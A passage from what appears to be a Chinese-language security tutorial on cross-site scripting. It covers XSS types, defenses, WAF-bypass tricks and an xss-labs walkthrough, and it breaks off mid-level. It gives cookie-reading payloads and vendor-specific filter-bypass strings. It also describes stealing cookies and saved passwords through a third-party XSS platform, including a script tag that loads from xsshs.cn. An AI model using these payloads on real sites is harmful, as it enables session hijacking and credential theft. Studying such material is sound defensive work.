<strong>后台数据库</strong>，只要有人访问了显示该数据内容的页面，就会被攻击</u>。存储型XSS又称持久型XSS，<strong>攻击脚本将被永久地存放在目标服务器的数据库或文件中</strong>，可能存在于一些我们信任的网站，具有很高的隐蔽性。</p><p>攻击方式：这种攻击<u>多见于论坛、博客和留言板</u>，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><p>相对于反射型，存储型的 XSS 成功率更高。</p><p>比如，下面的网站有留言板功能，尝试在 Name框或者Message 框提交弹窗脚本输出当前 cookie，可以构造如下XSS攻击语句<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，网站在回显我的留言时XSS脚本就会在HTML中执行。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728161005216.png" alt="image-20220728161005216"></p><h3 id="DOM-型-XSS（DOM）"><a href="#DOM-型-XSS（DOM）" class="headerlink" title="DOM 型 XSS（DOM）"></a>DOM 型 XSS（DOM）</h3><p>过程：参数x&#x3D;xss 然后发包 &#x3D;&gt; 携带该参数执行本地浏览器前端代码（XSS在前端被执行） （&#x3D;&gt; index.php &#x3D;&gt; 回包）</p><ul><li><p><strong>DOM</strong></p><p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够<strong>动态访问和更新文档的内容、结构及样式</strong>。根据用户在页面的操作或提交的参数，对网页进行动态更新，比如点击查看更多、在页面输入内容后立即回显在页面等。</p><p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。 通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节<br>点)均可被修改，也可以创建或删除节点。HTML DOM树结构如图所示。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728165551769.png" alt="image-20220728165551769" style="zoom:67%;"><p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p></li><li><p><strong>DOM型XSS</strong></p><p>DOM 型 XSS 是指 <strong>基于DOM文档对象模型</strong> 的 XSS 攻击，攻击的输出点就位于 DOM 对象上，如<code>document.referer</code>、<code>document.write</code>等等，是一种特殊类型的反射型XSS。<strong>由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞<u>不需要与服务器端交互</u>，它<u>只发生在客户端处理数据的阶段</u>。</strong></p><p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，<u>DOM对象就会处理XSS代码，在本地浏览器前端HTML执行攻击脚本，导致存在XSS漏洞</u>。</p></li><li><p><strong>举例</strong></p><p>比如下面的网站功能是选择一种语言，会以get请求接收参数default，并且在前端回显（会在HTML中用到所提交的参数）。查看页面HTML代码，发现default的值被用于以 <code>document.write</code> 的方式来写入网页，使网页显示所选的language，由此确定页面的XSS方式为DOM型。（对客户端网页进行了访问和更新）</p><p>在 URL 后直接加入攻击脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，即可实现攻击。</p><p>有时需要查看页面HTML源码，考虑闭合语法。比如当使用<code>img</code>标签进行攻击时，攻击脚本应为 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，以闭合select和option标签。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163628648.png" alt="image-20220728163628648"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163440677.png" alt="image-20220728163440677"></p><ul><li><p><strong>防御</strong></p><p>比如用户输入的参数”$var”被用于如下代码，造成DOM型的XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了防御这种XSS，可以采用编码的方法，在”$var” 输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode，以免又被自动解码。（<strong>执行两次编码</strong>）</p><p>也就是说，从javascript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p></li></ul><h2 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h2><ul><li><p>寻找目标网站</p><p>有注册输入栏、留言板之类的网站，能回显输入（也就是会在HTML中用到输入的参数）。</p></li><li><p>尝试提交攻击脚本，探查过滤规则，确定可行的攻击语句</p><p>可以使用自己构造的攻击语句；</p><p>也可以搜索XSS平台，借助XSS平台构造所需要功能的攻击语句。比如xsshs.cn、xss8.cc等。一般平台构造的语句中含有平台的链接，受害者执行攻击脚本中的该链接，导致XSS，然后在XSS平台可以查看到相应的执行结果。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171550607.png" alt="image-20220730171550607"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171634759.png" alt="image-20220730171634759"></p></li><li><p>查看网页元素，确定脚本执行情况</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171933630.png" alt="image-20220730171933630"></p><p>攻击脚本执行成功后，查看XSS平台，获取到浏览器信息，比如cookie。</p><p><img src="https://i0.hdslb.com/bfs/article/a6b01bee60a6cf7ea796d29f3d6a2e7efb2c7a84.png@831w_318h_progressive.webp" alt="img"></p></li><li><p>根据获得的信息进行进一步攻击</p><p>比如是网站的管理员执行了XSS，受到攻击，那么就能获取到管理员的cookie。</p><p>用户凭据：通过凭据可以判断对方身份信息</p><p><strong>cookie</strong>：存储本地，存活时间较长，常用于小中型网站（账号登录）</p><p><strong>session</strong>：会话，存储服务器（占用服务器资源），存活时间较短，常用于大型网站（支付）</p></li></ul><h2 id="XSS自动化工具"><a href="#XSS自动化工具" class="headerlink" title="XSS自动化工具"></a>XSS自动化工具</h2><p><strong>XSStrike</strong></p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>XSStrike <strong>主要支持反射和 DOM XSS</strong>，支持扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。 </p><p>XSStrike常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间（防止cc拦截）</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><p>使用流程：</p><ul><li><strong>运行工具</strong></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084135009.png" alt="image-20220801084135009"></p><ul><li><p><strong>fuzzer攻击语句扫描</strong></p><p>确定网站会过滤哪些语句，哪些语句又不会被拦截。</p><p>—offline说明waf是离线的状态，这里是因为该工具为外国开发，识别不到安全狗。</p><p>—passed为没有拦截，filtered为有过滤</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084340700.png" alt="image-20220801084340700"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084529954.png" alt="image-20220801084529954"></p></li><li><p><strong>测试扫描结果</strong></p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084601132.png" alt="image-20220801084601132"></p><ul><li><p><strong>选择攻击语句</strong></p><p>选择一个不会被拦截的XSS攻击语句，</p></li><li><p><strong>在浏览器中进行攻击</strong></p><p>有可能出现请求过于频繁，被网站拦截</p><p>—对于拦截，请求频繁被cc攻击拦截后，重启靶场phpStudy即可</p><p>—实际进行网站测试时，可以现在本地搭建环境，测试那些语句不会拦截在进行漏洞测试</p><p>—还有一种方法：用代理（比较麻烦）</p></li></ul><p><strong>或者直接自动攻击</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085042713.png" alt="image-20220801085042713"></p><p><strong>配合字典进行fuzz模糊测试：</strong></p><p><strong>xssfuzz在线fuzz工具</strong></p><p><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a></p><p>用于自动生成各种XSS攻击payload：</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220731151629014.png" alt="image-20220731151629014" style="zoom:50%;"><p><strong>BP配合fuzzDicts进行攻击：</strong></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085514970.png" alt="image-20220801085514970"></p><p>name参数作为变量：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085535275.png" alt="image-20220801085535275"></p><p>选择字典文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085627325.png" alt="image-20220801085627325"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085645342.png" alt="image-20220801085645342"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085833954.png" alt="image-20220801085833954"></p><p>不同的执行结果，返回的网页数据包长度会不同，这里数据包更大的表示XSS攻击失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085929875.png" alt="image-20220801085929875"></p><p><strong>xwaf</strong></p><p><a href="http://www.freebuf.com/news/127001.html">http://www.freebuf.com/news/127001.html</a></p><p>xwaf是一个python写的waf自动绕过工具。上一个版本是bypass_waf，xwaf相比bypass_waf更智能，可无人干预,自动暴破waf。</p><h2 id="XSS防护建议"><a href="#XSS防护建议" class="headerlink" title="XSS防护建议"></a>XSS防护建议</h2><ul><li><p><strong>代码过滤</strong>（黑名单）</p><p>包括URL、查询关键字、HTTP头、POST 数据等，仅接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律进行过滤。</p></li><li><p><strong>HttpOnly</strong></p><p><a href="https://www.oschina.net/question/100267_65116">https://www.oschina.net/question/100267_65116</a></p><p>如果您在cookie中设置了HttpOnly属性，那么 <strong>通过js脚本将无法读取到cookie信息（唯一的作用）</strong>，这样能有效的防止XSS攻击，但是并不能防止xss漏洞，只能是防止cookie被盗取。</p><p>一般除了开启 httponly，还会同时将用户所提供的内容输入输出进行过滤，许多语言都有提供对HTML的过滤。</p><ul><li><p>对于PHP而言：<a href="https://www.zuimoge.com/212.html">https://www.zuimoge.com/212.html</a></p><p>可以在php.ini文件内修改<code>session.cookie_httponly=True</code>，可以在网页php代码中开启<code>ini_set(&quot;session.cookie_httponly&quot;, 1)</code>，还可以在输入输出进行关键字、大小写、特殊符号过滤等等。比如PHP的htmlentities()和htmlspecialchars()这两个函数可以把字符转换为 HTML 实体，使得攻击代码失效。ASP的Server.HTMLEncode()对一段指定的字符串应用 HTML 编码。</p></li><li><p>对于Java而言（ESAPI）：<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p><p>ESAPI是一个Apache开发的安全组件，首先应当配置过滤器（注意在过滤器中chain.doFilter(..)方法中的Request对象进行包装，在包装类中对请求参数进行筛选操作）。其次将过滤器注册到web.xml文件中；最后配置Request的包装类，在其中对请求信息进行过滤。</p><p>可以选择使用CSF(Content Security Policy)安全策略：CSF是一种白名单防御策略，所有不在名单内的资源都不被信任，有效的防止了通过外部的标签、脚本、JS文件等资源的入侵形式。</p></li></ul></li><li><p>WAF</p></li></ul><h2 id="HttpOnly的绕过"><a href="#HttpOnly的绕过" class="headerlink" title="HttpOnly的绕过"></a>HttpOnly的绕过</h2><ul><li><p>若浏览器未保存帐号密码</p><p>利用表单劫持，得到用户输入的账号密码，并抄送到XSS平台上去，再应用到XSS攻击中。</p><p>前提条件1：明文密码；前提条件2：XSS存在于登录框才行，比较鸡肋</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104453015.png" alt="image-20220801104453015"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104215899.png" alt="image-20220801104215899"></p></li><li><p>若浏览器保存帐号密码</p><p>浏览器读取帐号密码。根据表单配置XSS平台，然后写入XSS代码。</p><p>确定注册时的表单属性信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104757064.png" alt="image-20220801104757064"></p><p>在XSS平台创建一个项目，点击配置，选择获取浏览器保存的账号密码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104653286.png" alt="image-20220801104653286"></p><p>按照网站的表单信息填写相应的属性：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104836681.png" alt="image-20220801104836681"></p><p>配置完成后，按照XSS平台提供的攻击语句在浏览器执行攻击，比如<code>&lt;sCRiPt sRC=//xsshs.cn/9TUt&gt;&lt;/sCrIpT&gt;</code>。</p></li></ul><h2 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h2><p>常见WAF过滤的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  &lt;a&gt;  &lt;p&gt;  &lt;img&gt;  &lt;body&gt; &lt;button&gt;  &lt;var&gt;  &lt;div&gt;  &lt;iframe&gt;  &lt;object&gt; &lt;input&gt; </span><br><span class="line">&lt;textarea&gt;  &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt;  &lt;svg&gt;  &lt;math&gt;  &lt;video&gt;  &lt;audio&gt; &lt;select&gt;</span><br></pre></td></tr></table></figure><h3 id="黑名单（大小写绕过）"><a href="#黑名单（大小写绕过）" class="headerlink" title="黑名单（大小写绕过）"></a>黑名单（大小写绕过）</h3><p>过滤单引号、双引号、&lt;、&gt;、on开头的单词等非法字符。</p><p>比如过滤script，但是没有考虑大小写：</p><p><code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="删除黑名单字段（重复数据绕过）"><a href="#删除黑名单字段（重复数据绕过）" class="headerlink" title="删除黑名单字段（重复数据绕过）"></a>删除黑名单字段（重复数据绕过）</h3><p>尝试在 <code>&lt;script&gt;</code> 中再嵌套一个 <code>&lt;script&gt;</code>绕过：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="特殊符号干扰"><a href="#特殊符号干扰" class="headerlink" title="特殊符号干扰"></a>特殊符号干扰</h3><ul><li><p>引号闭合参数，不要&gt;</p><p>如果对&lt;&gt;进行了过滤，无法使用，可以用引号闭合链接（对于来自XSS平台的含有XSS的恶意链接）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;</code>是有可能成功攻击的。</p></li><li><p><code>/</code>干扰</p><p><code>&lt;/img src=&quot;#&quot; onerror=&quot;javascript:alert(1)&quot;sbjkdsbfjeb#&gt;</code></p></li></ul><h3 id="标签语法替换"><a href="#标签语法替换" class="headerlink" title="标签语法替换"></a>标签语法替换</h3><p>使用代码 <code>$name = preg_replace( &#39;/&lt;(.\*)s(.\*)c(.\*)r(.\*)i(.\*)p(.\*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，<code>.</code>代表任意字符，<code>*</code>代表匹配前一个字符0或无限次。其中<code>preg_replace</code> 函数可以调用正则表达式，进行 script 的逐字检查，并通过 <code>/i</code> 来不区分大小写。</p><p>但是上述代码只考虑了script标签的XSS，其实 <strong>JS 脚本不仅仅可以在 <code>&lt;script&gt;</code> 标签中使用，通过 <code>&lt;img&gt;</code> 标签中 <code>onerror</code> 行为也可以调用 JS 脚本。</strong></p><p>提交 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，攻击成功。</p><p>也可尝试更多其他标签，比如<code>&lt;a&gt;</code>、<code>&lt;svg&gt;</code>、<code>&lt;audio&gt;</code>等。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728162118390.png" alt="image-20220728162118390"></p><h3 id="字符长度限制绕过"><a href="#字符长度限制绕过" class="headerlink" title="字符长度限制绕过"></a>字符长度限制绕过</h3><p>如果只是在浏览器前端进行的字符长度限制，那么要么禁用或者修改前端的相关JS脚本，要么绕过前端在 Burpsuite 中修改数据包就可以轻松绕过限制。</p><h3 id="提交方式更改"><a href="#提交方式更改" class="headerlink" title="提交方式更改"></a>提交方式更改</h3><p>get不行，换post。</p><p>比如安全狗的部分拦截仅针对URL（get）进行检测。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731151918996.png" alt="image-20220731151918996"></p><p>更换为post提交后payload成功执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731152045595.png" alt="image-20220731152045595"></p><p>有时也可以选择 HTTP 头部进行注入：</p><p>Referer表示本网页的上一个URL，这里的攻击语句首先使用引号闭合语法，然后定义type为text，使得alert(1)能够显示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092502124.png" alt="image-20220801092502124"></p><p>攻击成功，网页上出现弹框：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092649962.png" alt="image-20220801092649962"></p><h3 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" title="垃圾数据溢出"></a>垃圾数据溢出</h3><p>在脚本末尾加上大量无关字符，导致过滤条件失效。注意最后要加上#注释、或者&#x2F;&#x2F;、或者–+，需要自己试（特殊符号干扰）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;fhdhbgdioslbdvs#&gt;</code></p><h3 id="编码转换（编码绕过）"><a href="#编码转换（编码绕过）" class="headerlink" title="编码转换（编码绕过）"></a>编码转换（编码绕过）</h3><p>对输入到页面的数据进行编码转换，使得攻击语句的某些特殊字符被编码，攻击失效。</p><p>绕过时，对攻击语句也主动进行编码即可，网站发现这些字符已经被编码，会自动对某些编码进行解码。。</p><p>包括JS编码，HTML实体编码，URL编码。</p><ul><li><p>JS编码</p><p>JS提供了四种编码策略：</p><p>三个八进制数字，如果个数不够，在前面补0，比如”e”的编码为”\145”；</p><p>两个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\x65”；</p><p>四个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\u005”；</p><p>对于一些控制字符，使用特殊的C类型的转义风格。</p></li><li><p>HTML实体编码</p><p>命名实体：以&amp;开头，以分号结尾，例如<code>&lt;</code>的编码是<code>&amp;lt;</code>。</p><p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为<code>&amp;#数值;</code>，例如<code>&lt;</code>的编码是<code>&amp;#060;</code>和<code>&amp;#x3c;</code>。</p></li><li><p>URL编码</p><p>由于网页会对URL进行一次解码，所以使用URL编码绕过时有时需要进行两次编码。所以在使用编码测试时，需要考虑HTML的渲染顺序，选择合适的编码方式进行测试。</p></li></ul><p>针对不同的WAF产品，有不同的编码绕过方法：<a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a></p><p>针对Cloudflare，使用无空格filler绕过：<code>&lt;a&quot;/onclick=(confirm)()&gt;click\</code></p><p>针对Worldfence，使用数字符编码绕过：<code>&lt;a/href=javascript&amp;colon;alert()&gt;click\</code></p><p>针对Barracuda，使用数字符编码绕过：<code>&lt;a/href=&amp;#74;ava%0a%ed%09script&amp;colon;alert()&gt;click\</code></p><p>针对Akamai，使用黑名单中缺少的event handler;混淆函数调用：<code>&lt;d3v/onauxclick-[2]. some(conf irm)&gt;click\</code></p><h3 id="内置函数转义（难绕过）"><a href="#内置函数转义（难绕过）" class="headerlink" title="内置函数转义（难绕过）"></a>内置函数转义（难绕过）</h3><p>使用 <code>htmlspecialchars</code> 函数对提交的信息进行 <strong>转义</strong>。该函数会将所有特殊字符转义为 HTML 实体。比如把 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，把 <code>&gt;</code> 转义为 <code>&amp;gt;</code>。只要正确的使用该函数，XSS 攻击就可以彻底杜绝。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>xss-labs通关大合集：</p><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332%E3%80%81">https://blog.csdn.net/wo41ge/article/details/107459332、</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/123592092">https://blog.csdn.net/m0_62879498/article/details/123592092</a></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>所输入name的值会回显在<code>&lt;h2&gt;&lt;/h2&gt;</code>中，因此直接插入script：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述语句是标准模板，后面的关卡均可以先输入上述内容，来判断所使用的防御手段。</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>中的内容被实体编码了，但在Input中没有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;ccb&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此在value中插入script，但是注意<code>&quot;&gt;</code>闭合以及注释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>以及<code>&lt;input&gt;</code>中的内容均被实体编码，无法使用&lt;&gt;。</p><p>因此，使用<code>&lt;input&gt;</code>的特殊事件来触发script，input的&lt;&gt;可以不闭合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#x27; onfocus=javascript:alert(1)//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27; onfocus=javascript:alert(1)//&#x27;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击输入框即可出发onfocus事件。</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>第三关的单引号闭合换为双引号。</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试，发现script、onfocus、οnmοuseοver 均被注释掉了。使用<code>&lt;a&gt;</code>标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>经过尝试，发现script和href均被过滤。使用大小写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p><code>&lt;input&gt;</code>的value值未被实体编码，但是若提交的内容中有script、href会被替换为空。双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;ccb&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>引号、&lt;、&gt;均被实体编码，href、script又被过滤，只能使用编码绕过。</p><p>将<code>javascript:alert(1)</code>中的script转化为实体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>在第8关的基础上，强制输入的内容要带有<code>http://</code>，不然报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(`http://`)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>页面上没有输入框，检查源码发现有三个<code>&lt;input&gt;</code>，尝试输入发现只有t_sort会回显。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=ccb</span><br><span class="line"></span><br><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span 